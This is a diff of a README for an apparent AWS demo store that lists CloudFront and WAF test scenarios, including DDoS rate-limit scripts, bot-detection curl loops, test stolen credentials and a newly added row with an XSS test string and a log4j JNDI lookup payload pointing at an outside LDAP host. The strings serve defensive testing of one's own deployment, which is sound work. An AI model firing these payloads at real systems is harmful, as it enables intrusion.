@@ -9,7 +9,7 @@ git clone https://github.com/achrafsouk/recycle-bin-boutique.git
 cd recycle-bin-boutique/store-infra
 npm install
 npm install -f --omit=optional --prefix functions/image-processing-lambda sharp @img/sharp-linux-x64 @img/sharp-libvips-linux-x64
-cdk deploy
+cdk deploy --outputs-file ../store-app/aws-backend-config.json
 ```
 
 # Architecture
@@ -33,7 +33,7 @@ Navigate to scripts folder using the ```cd scripts``` command, then go through t
 |:------------- |:--------------- | :-------------|
 | **DDoS** | Reduce attack surface of backend| Go to the deployed EC2 instance (_store_backend_ec2_), and try to load the page on port 3000. Connection will be refused, since only CloudFront IPs are allowed to using CloudFront prefixlist in its security group. | 
 | **DDoS** | Reduce attack surface of APIs| Some APIs in the backend are only meant to be used by NextJS when rendering the page on the server side. Navigate to one of these APIs (e.g. api/products, api/product) and verify that you are blocked. | 
-| **DDoS** | Malicious IPs | Load the website using a VPN proxy site (e.g. https://www.blockaway.net), and verify that the page is blocked. Note that this might not happen all the time as VPN operators constantly change their IPs.|
+| **DDoS** | Malicious IPs | Load the website using a VPN proxy site (e.g. https://www.blockaway.net), and verify that the page is cahllenged with Captcha. Note that this might not happen all the time as VPN operators constantly change their IPs.|
 | **DDoS** | Rate limit with 400 threshold | Run the following bash script in AWS cloudshell, and verify how AWS WAF blocks an IP after threshold is breached within tens of seconds. Since the page does not exist, 404 response is returned, then a 202 challenge request is returned by the subsequent rules, and finally this rule will block with 403 <br/> ```bash rate-limit-test.sh https://xxxxxxxx.cloudfront.net/non_existing_page 400``` |
 | **Web Scraping** | User-Agent classification | Run the following curl, and verify that WAF detects and blocks this HTTP library: <br/> ```curl -I https://xxxxxxxx.cloudfront.net/``` |
 | **Web Scraping** | HTTP library detection | Execute the following curl and verify that a 202 javascript challenge is returned to force the acquisition of a token after multiple attempts without it from the same IP: <br/> ```for i in {1..30}; do curl -I --include --silent https://xxxxxxxx.cloudfront.net/ -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36' \| grep -e HTTP/ -e x-amzn-waf-action; done``` <br/> Load the page using another browser to see the silent challenge in action|
@@ -43,6 +43,7 @@ Navigate to scripts folder using the ```cd scripts``` command, then go through t
 | **Credential Stuffing** | Stolen credential detection | Use the following test _stolen credentials_ and verify that the api returns 403 block  <br/> ```WAF_TEST_CREDENTIAL@wafexample.com``` <br/> ```WAF_TEST_CREDENTIAL_PASSWORD``` |
 | **Credential Stuffing** | Password traversal detection | Using the same username, e.g. joe, login with different passwords 10-20 times until the api call returns 403 |
 | **Fake Account Creation** | Use a session to create many accounts | Try to create multiple acounts, and verify a 405 block after a few successful attempts |
+| **Application vulnerability exploit** | OWASP TBD | ```product/<script><alert>Hello></alert></script>``` or in registration form, and log4j ```${jndi:ldap://example.com/}``` |
 
 # Content delivery testing scenarios
 
@@ -55,6 +56,10 @@ Navigate to scripts folder using the ```cd scripts``` command, then go through t
 | **HTTP redirection** | Redirect obselete links| Load this non existing campaign page ```/oldCampaign```. Verify that 404 is returned. Add the following http redirection rule to the deployed KeyValueStore, then validate that you are redirected to home page. <br/> Key: ```/oldCampaign``` <br/> Value: ```{ "rules": { "redirect" : "/" }}```| 
 | **Observability - Server Timing Header** | Understand Server timing headers sent by CloudFront| Check this header on the home page response, and generate a new image size and check how the header value is incremented | 
 | **Brotli compression** | Compress JS/CSS/HTML| Verify brotli compression on page text resources | 
+| **Protocol acceleration** |TBD H3 | TBD | 
+| **Caching** |TBD difference for home page | TBD | 
+| **Dynamic acceleration** |TBD difference for home page | TBD | 
+| **Lazy loading** |TBD app level | TBD | 
 
 
 # Troubleshooting
@@ -81,31 +86,27 @@ fields @timestamp, @message
 ![](rbb-flow.png)
 
 
-# Work in progress WIP
+# Future work
 
 ## Improve scenarios
 * Review scnarios holisitcally, and evolve narration to to do build ups (attack scenarios, or performance improvement)
 * Use cloudshell when possible
-* Change VPN scnenario to Captcha
-* Reduce impact of random Captcha on loading pages (e.g. broken images)
   
 ## Add scenarios  
 * Observability: WAF logs in CloudWatch logs, Athena for CloudFront logs, CloudWatch Metrics. RUM + SERVER TIMING integration
+* Social allowed 
 * Graceful failover when origin not responding
-* OWASP relatd attack
 * Waiting room
 * Report false positive page
-* Google search allow list
 * Captcha before registration example
-* Lazy loading
 * Speculation API
 * Video content
 
 ## Evolve code 
-* Refactor nextjs app code (images, state, storage, router, apis, etc..)
-* Review Infra code: CSP, Custom resource lifecycle management, custom resource permissions, multiregion, Inforce origin cloaking at L7
-* Generate secret key dynamically with CDK.
+* Refactor nextjs app code (state, router, storage, apis, user first name/ family name etc..)
+* Review Infra code: CSP, Custom resource lifecycle management, custom resource permissions, Inforce origin cloaking at L7
 * Improve caching: Origin shield, review caching rules holisitcally
 * Generate intial data using GenAI
 * GenAI search bar
+* output aws config file in store-app folder automatically for troubleshooting
 
